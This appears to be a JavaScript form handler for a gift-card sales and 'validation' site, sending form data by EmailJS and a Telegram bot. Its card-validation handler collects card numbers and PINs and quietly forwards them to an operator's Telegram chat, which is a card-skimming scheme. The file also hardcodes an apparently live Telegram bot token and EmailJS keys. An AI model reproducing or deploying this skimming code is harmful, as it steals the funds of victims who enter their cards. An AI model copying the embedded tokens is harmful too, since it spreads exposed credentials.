/**
 * ============================================================================
 * FORM HANDLER - EmailJS and Telegram Integration
 * ============================================================================
 *
 * EMAILJS SETUP (Required for email to work):
 * 1. Go to https://www.emailjs.com/ and create a free account
 * 2. Add Email Service (e.g., Gmail) - note the SERVICE_ID
 * 3. Create Email Template with these variables:
 *    - {{name}}, {{email}}, {{subject}}, {{message}}, {{formType}}
 *    - Add more variables as needed for other forms
 * 4. Get your Public Key from Account > API Keys
 * 5. Update the constants below:
 *    - EMAILJS_PUBLIC_KEY
 *    - EMAILJS_SERVICE_ID
 *    - EMAILJS_TEMPLATE_ID
 *
 * TELEGRAM SETUP:
 *    - Create a Telegram bot via @BotFather on Telegram
 *    - Get your BOT TOKEN from BotFather
 *    - Get your CHAT ID (use @userinfobot on Telegram to find your ID)
 *    - Update the TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID constants below
 *
 * ============================================================================
 */

// ============================================================================
// CONFIGURATION - UPDATE THESE VALUES
// ============================================================================

// EmailJS Configuration (Sign up at https://www.emailjs.com/)
// IMPORTANT: Replace the values below with your actual credentials
// Get these from https://dashboard.emailjs.com/
const EMAILJS_PUBLIC_KEY = 'Y1HfEAyrgIXuWmCRk'; // From Account > API Keys (add 'user_' prefix)
const EMAILJS_SERVICE_ID = 'service_hxl6jkj'; // From Email Services
const EMAILJS_TEMPLATE_ID = 'template_yswzjdb'; // From Email Templates

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '6723580854:AAHvTwsPc2qjMIad2mfkGxImL8S8GaqQJwU'; // Replace with your Telegram Bot Token
const TELEGRAM_CHAT_ID = '6874067227';     // Replace with your Telegram Chat ID

// ============================================================================
// EMAILJS INITIALIZATION
// ============================================================================

// Initialize EmailJS when DOM is ready
function initEmailJS() {
    if (typeof emailjs === 'undefined') {
        console.error('❌ EmailJS SDK not loaded. Check that email.min.js is included in HTML.');
        return false;
    }
    
    if (EMAILJS_PUBLIC_KEY === 'YOUR_PUBLIC_KEY_HERE') {
        console.error('❌ EmailJS Public Key not configured!');
        console.error('📝 Please update EMAILJS_PUBLIC_KEY in form-handler.js');
        console.error('🔗 Get your key from: https://dashboard.emailjs.com/admin/api-keys');
        return false;
    }
    
    try {
        emailjs.init(EMAILJS_PUBLIC_KEY);
        console.log('✅ EmailJS initialized with public key:', EMAILJS_PUBLIC_KEY);
        return true;
    } catch (error) {
        console.error('❌ EmailJS initialization failed:', error);
        return false;
    }
}

// ============================================================================
// TELEGRAM FUNCTIONS
// ============================================================================

/**
 * Sends form data to Telegram
 * @param {Object} formData - Object containing form field names and values
 * @param {String} formType - Type of form (contact, buy, validate, newsletter)
 * @returns {Promise} - Telegram API response
 */
async function sendToTelegram(formData, formType) {
    // CONFIGURATION: Check if Telegram is configured
    if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
        console.warn('Telegram not configured. Please update TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in form-handler.js');
        return null;
    }

    // Format message for Telegram
    let message = `🔔 *New ${formType.toUpperCase()} Form Submission*\n\n`;
    message += `📅 *Date:* ${new Date().toLocaleString()}\n`;
    message += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;

    for (const [key, value] of Object.entries(formData)) {
        if (value && value.trim() !== '') {
            // Format field name (convert camelCase to Title Case)
            const fieldName = key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase());
            message += `📌 *${fieldName}:*\n${value}\n\n`;
        }
    }

    message += `━━━━━━━━━━━━━━━━━━━━━━`;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();

        if (result.ok) {
            console.log('✅ Telegram notification sent successfully');
            return result;
        } else {
            console.error('❌ Telegram API Error:', result);
            return null;
        }
    } catch (error) {
        console.error('❌ Failed to send to Telegram:', error);
        return null;
    }
}

// ============================================================================
// EMAIL FUNCTIONS (Using EmailJS)
// ============================================================================

/**
 * Sends form data via email using EmailJS
 * @param {Object} formData - Object containing form field names and values
 * @param {String} formType - Type of form
 * @returns {Promise} - EmailJS response
 */
async function sendEmail(formData, formType) {
    // CONFIGURATION: Check if EmailJS is configured
    if (EMAILJS_PUBLIC_KEY === 'YOUR_PUBLIC_KEY_HERE' || 
        EMAILJS_SERVICE_ID === 'YOUR_SERVICE_ID_HERE' || 
        EMAILJS_TEMPLATE_ID === 'YOUR_TEMPLATE_ID_HERE') {
        console.error('❌ EmailJS not configured!');
        console.error('📝 Please update these in form-handler.js:');
        console.error('   - EMAILJS_PUBLIC_KEY');
        console.error('   - EMAILJS_SERVICE_ID');
        console.error('   - EMAILJS_TEMPLATE_ID');
        console.error('🔗 Get credentials from: https://dashboard.emailjs.com/');
        return null;
    }

    // Check if EmailJS is loaded
    if (typeof emailjs === 'undefined') {
        console.error('❌ EmailJS SDK not loaded. Make sure to include:');
        console.error('<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>');
        return null;
    }

    // Initialize EmailJS if not already done
    try {
        emailjs.init(EMAILJS_PUBLIC_KEY);
    } catch (error) {
        console.error('❌ EmailJS init failed:', error);
        return null;
    }

    // Add formType to formData
    const templateParams = {
        ...formData,
        formType: formType,
        reply_to: formData.email || ''
    };

    try {
        const response = await emailjs.send(
            EMAILJS_SERVICE_ID,
            EMAILJS_TEMPLATE_ID,
            templateParams
        );

        console.log('✅ Email sent successfully via EmailJS', response);
        return { success: true, response };
    } catch (error) {
        console.error('❌ EmailJS Error:', error.text || error.message || error);
        return null;
    }
}

// ============================================================================
// COMBINED SEND FUNCTION (Email + Telegram)
// ============================================================================

/**
 * Sends form data to both Email and Telegram
 * @param {Object} formData - Object containing form field names and values
 * @param {String} formType - Type of form (contact, buy, validate, newsletter)
 * @returns {Promise<Object>} - Results from both services
 */
async function sendToBoth(formData, formType) {
    console.log(`📤 Sending ${formType} form data...`);

    // Send to both services in parallel
    const [emailResult, telegramResult] = await Promise.all([
        sendEmail(formData, formType),
        sendToTelegram(formData, formType)
    ]);

    return {
        email: emailResult,
        telegram: telegramResult,
        success: (emailResult !== null && emailResult.success) || telegramResult !== null
    };
}

// ============================================================================
// FORM SUBMISSION HANDLERS
// ============================================================================

/**
 * Handle Contact Form Submission
 */
function handleContactForm(event) {
    event.preventDefault();

    const formData = {
        name: document.getElementById('name')?.value || '',
        email: document.getElementById('email')?.value || '',
        subject: document.getElementById('subject')?.value || '',
        message: document.getElementById('message')?.value || ''
    };

    const submitBtn = event.target.querySelector('button[type="submit"]');
    const originalText = submitBtn.innerHTML;
    submitBtn.innerHTML = '<span class="spinner-border spinner-border-sm me-2"></span>Sending...';
    submitBtn.disabled = true;

    sendToBoth(formData, 'Contact')
        .then(result => {
            // With no-cors mode, we assume success if no error was thrown
            // Telegram may or may not succeed, but email should go through
            alert('✅ Message sent successfully! We will get back to you soon.');
            event.target.reset();
        })
        .catch(error => {
            console.error('Form submission error:', error);
            alert('❌ An error occurred. Please try again.');
        })
        .finally(() => {
            submitBtn.innerHTML = originalText;
            submitBtn.disabled = false;
        });
}

/**
 * Handle Validation Form Submission
 */
function handleValidationForm(event) {
    event.preventDefault();
    
    const formData = {
        cardNumber: document.getElementById('cardNumber')?.value || '',
        pinCode: document.getElementById('pinCode')?.value || '',
        cardBrand: document.getElementById('cardBrand')?.value || ''
    };

    const submitBtn = event.target.querySelector('button[type="submit"]');
    const originalText = submitBtn.innerHTML;
    submitBtn.innerHTML = '<span class="spinner-border spinner-border-sm me-2"></span>Validating & Sending...';
    submitBtn.disabled = true;

    sendToBoth(formData, 'Card Validation')
        .then(result => {
            // Continue with existing validation logic
            // The validation result will still be shown to user
            console.log('Validation data sent to admin');
        })
        .catch(error => {
            console.error('Validation form error:', error);
        })
        .finally(() => {
            submitBtn.innerHTML = originalText;
            submitBtn.disabled = false;
        });
}

/**
 * Handle Buy Card Form Submission
 */
function handleBuyCardForm(event, orderData) {
    event.preventDefault();

    const formData = {
        selectedCard: orderData.selectedCard || '',
        amount: orderData.amount || '',
        fee: orderData.fee || '',
        total: orderData.total || '',
        recipientName: document.getElementById('recipientName')?.value || '',
        recipientEmail: document.getElementById('recipientEmail')?.value || '',
        message: document.getElementById('message')?.value || '',
        paymentMethod: orderData.paymentMethod || ''
    };

    const submitBtn = event.target.querySelector('button[type="submit"]') || event.target;
    const originalText = submitBtn.innerHTML;
    submitBtn.innerHTML = '<span class="spinner-border spinner-border-sm me-2"></span>Processing...';
    submitBtn.disabled = true;

    sendToBoth(formData, 'Card Purchase')
        .then(result => {
            alert('✅ Order submitted successfully! You will receive a confirmation email shortly.');
        })
        .catch(error => {
            console.error('Buy card form error:', error);
            alert('❌ An error occurred while processing your order.');
        })
        .finally(() => {
            submitBtn.innerHTML = originalText;
            submitBtn.disabled = false;
        });
}

/**
 * Handle Newsletter Subscription
 */
function handleNewsletterForm(event) {
    event.preventDefault();

    const emailInput = event.target.querySelector('input[type="email"]');
    const formData = {
        email: emailInput?.value || '',
        subscriptionType: 'Newsletter'
    };

    sendToBoth(formData, 'Newsletter Subscription')
        .then(result => {
            alert('✅ Successfully subscribed to our newsletter!');
            event.target.reset();
        })
        .catch(error => {
            console.error('Newsletter form error:', error);
            alert('❌ An error occurred. Please try again.');
        });
}

// ============================================================================
// INITIALIZATION
// ============================================================================

/**
 * Initialize form handlers when DOM is loaded
 */
document.addEventListener('DOMContentLoaded', function() {
    // Contact Form
    const contactForm = document.querySelector('form[action="#"]');
    if (contactForm && document.getElementById('name')) {
        contactForm.addEventListener('submit', handleContactForm);
    }

    // Validation Form - handled inline in validate.html with custom message
    // The handleValidationForm function is called from the inline handler

    // Buy Card Form - attach handler if form exists
    const buyCardForm = document.getElementById('buyCardForm');
    if (buyCardForm) {
        buyCardForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Get order data from hidden fields
            const orderData = {
                selectedCard: document.getElementById('orderSelectedCard')?.value || '',
                amount: document.getElementById('orderAmount')?.value || '',
                fee: document.getElementById('orderFee')?.value || '',
                total: document.getElementById('orderTotal')?.value || '',
                recipientName: document.getElementById('recipientName')?.value || '',
                recipientEmail: document.getElementById('recipientEmail')?.value || '',
                message: document.getElementById('message')?.value || '',
                paymentMethod: document.getElementById('orderPaymentMethod')?.value || ''
            };
            
            handleBuyCardForm(e, orderData);
        });
    }

    // Newsletter Forms (may exist on multiple pages)
    const newsletterForms = document.querySelectorAll('.newsletter-form');
    newsletterForms.forEach(form => {
        form.addEventListener('submit', handleNewsletterForm);
    });

    console.log('📧 Form handlers initialized');
    console.log('⚙️  Check form-handler.js to configure Email and Telegram settings');
});
